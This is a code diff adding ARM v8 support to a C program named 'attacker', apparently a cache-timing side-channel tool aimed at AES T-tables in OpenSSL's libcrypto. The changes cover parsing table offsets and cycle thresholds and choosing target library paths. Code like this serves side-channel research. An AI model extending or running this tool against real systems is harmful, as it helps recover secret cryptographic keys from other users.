@@ -169,14 +169,25 @@ static void set_last_round_attack_args(char **argv)
 	/* set arguments */
 	args->plain_text_cnt = atoi(argv[1]);
 	args->cpu_cycle_threshold = atoi(argv[2]);
+
+#ifdef TARGET_ARM_V8
+	args->is_use_te4 = 0;
+	hex_string_to_int(argv[3], strlen(argv[3]), &args->off_te0);
+	hex_string_to_int(argv[4], strlen(argv[4]), &args->off_te1);
+	hex_string_to_int(argv[5], strlen(argv[5]), &args->off_te2);
+	hex_string_to_int(argv[6], strlen(argv[6]), &args->off_te3);
+	hex_string_to_int(argv[7], strlen(argv[7]), &args->off_rcon);
+#else
+	args->is_use_te4 = 1;
 	hex_string_to_int(argv[3], strlen(argv[3]), &args->off_te4);
 	hex_string_to_int(argv[4], strlen(argv[4]), &args->off_rcon);
+#endif
 	
 	args->cache_line_size = 64;
+
 #ifdef TARGET_CRYPTO_CRYPTOCORE
 	sprintf(args->crypto_lib, "%s", "/usr/lib/libcryptocore.so");
 #elif TARGET_ARM_V8
-	#pragma message("TARGET_ARM_V8")
 	sprintf(args->crypto_lib, "%s", "/usr/lib/libcrypto.so.1.0.0");
 #else
 	sprintf(args->crypto_lib, "%s", "/usr/lib/libcrypto.so.0.9.8");
@@ -191,11 +202,19 @@ int main(int argc, char **argv)
 {
 	int i, r;
 	
+#ifdef TARGET_ARM_V8
+	if(argc != 8) {
+		printf("USAGE : ./attacker <limit plain text count> <cpu cycle threshold> <offset te0> <offset te1> <offset te2> <offset te3> <offset rcon>\n");
+		printf("EXAMPLE : ./attacker 1000 200 0010c0b8 0010c4b8 0010c4c8 0010c4d8 0010c4e8\n");
+		return 0;
+	}
+#else
 	if(argc != 5) {
 		printf("USAGE : ./attacker <limit plain text count> <cpu cycle threshold> <offset te4> <offset rcon>\n");
 		printf("EXAMPLE : ./attacker 1000 200 0010c0b8 0010c4b8\n");
 		return 0;
 	}
+#endif
 	
 	/* 1. Initialize */
 	r = security_daemon_connect();
